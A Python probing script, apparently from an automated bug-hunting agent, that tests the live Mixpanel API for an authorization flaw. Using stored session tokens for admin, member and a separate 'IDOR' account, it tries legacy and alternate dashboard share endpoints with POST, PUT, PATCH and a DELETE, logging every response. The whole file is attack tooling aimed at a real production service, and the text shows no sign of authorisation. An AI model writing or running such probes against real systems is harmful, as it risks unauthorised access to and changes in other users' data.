#!/usr/bin/env python3
"""Final pass — try legacy + alternate share-create endpoints, and exhaustive POST shapes."""
import sys, os, json, time
sys.path.insert(0, '/home/hunter/new_agent/.claude/lib')
from safe_http import SafeHttp

sh = SafeHttp(allow_raw_for_waf=True)
TOK = json.load(open('/home/hunter/new_agent/targets/mixpanel/recon/tokens.json'))

def H(role, extra=None):
    h = dict(TOK[role]['api_request_headers'])
    h["User-Agent"] = "Mozilla/5.0"
    h["Accept"] = "application/json"
    h["Content-Type"] = "application/json"
    h["X-Requested-With"] = "XMLHttpRequest"
    h["Origin"] = "https://mixpanel.com"
    if extra: h.update(extra)
    return h

BASE = "https://mixpanel.com"
PROJ = 4025923
DASH = 11207838

LOG = open('/home/hunter/new_agent/results/mixpanel/probe_share13_log.txt', 'w')
def log(msg):
    print(msg); LOG.write(msg+"\n"); LOG.flush()

# 1. Some Mixpanel APIs use the legacy /api/2.0/ path with project_id query param
for m, path, params, body in [
    ("POST", "/api/2.0/dashboards/public", {"project_id": PROJ, "dashboard_id": DASH}, None),
    ("POST", "/api/2.0/public-dashboards/", {"project_id": PROJ, "dashboard_id": DASH}, None),
    ("POST", "/api/2.0/bookmarks/share", {"project_id": PROJ, "bookmark_id": DASH}, None),
    ("POST", "/api/2.0/dashboards/share", {"project_id": PROJ, "dashboard_id": DASH}, None),
    ("GET",  "/api/2.0/dashboards", {"project_id": PROJ}, None),
    ("GET",  "/api/2.0/public-dashboards", {"project_id": PROJ}, None),
]:
    from urllib.parse import urlencode
    url = f"{BASE}{path}?{urlencode(params)}"
    try:
        r = sh.request(m, url, headers=H('ADMIN'), data=body)
        log(f"{m} {url} -> {r.status_code} body={r.text[:300]!r}")
    except Exception as e:
        log(f"{m} {url} -> ERR {e}")
    time.sleep(0.6)

# 2. Test POST /api/app/projects/{PROJ}/public-dashboards/{DASH} with auth from a different user (IDOR test for share-create)
for role in ['IDOR','MEMBER','ADMIN']:
    url = f"{BASE}/api/app/projects/{PROJ}/public-dashboards/{DASH}"
    try:
        r = sh.request("POST", url, headers=H(role), data="{}")
        log(f"POST {url} role={role} -> {r.status_code} body={r.text[:300]!r}")
    except Exception as e:
        log(f"POST {url} role={role} -> ERR {e}")
    time.sleep(0.6)

# 3. Maybe the API actually uses an _id field; try with project_id in QUERY
from urllib.parse import urlencode
for m in ("POST", "PUT", "PATCH"):
    for params in [{"project_id": PROJ}, {"project_id": PROJ, "dashboard_id": DASH}]:
        url = f"{BASE}/api/app/projects/{PROJ}/public-dashboards/{DASH}?{urlencode(params)}"
        try:
            r = sh.request(m, url, headers=H('ADMIN'), data="{}")
            log(f"{m} {url} -> {r.status_code} body={r.text[:300]!r}")
        except Exception as e:
            log(f"{m} {url} -> ERR {e}")
        time.sleep(0.6)

# 4. DELETE — does it work without the link existing?
url = f"{BASE}/api/app/projects/{PROJ}/public-dashboards/{DASH}"
try:
    r = sh.request("DELETE", url, headers=H('ADMIN'))
    log(f"DELETE {url} -> {r.status_code} body={r.text[:300]!r}")
except Exception as e:
    log(f"DELETE {url} -> ERR {e}")
LOG.close()
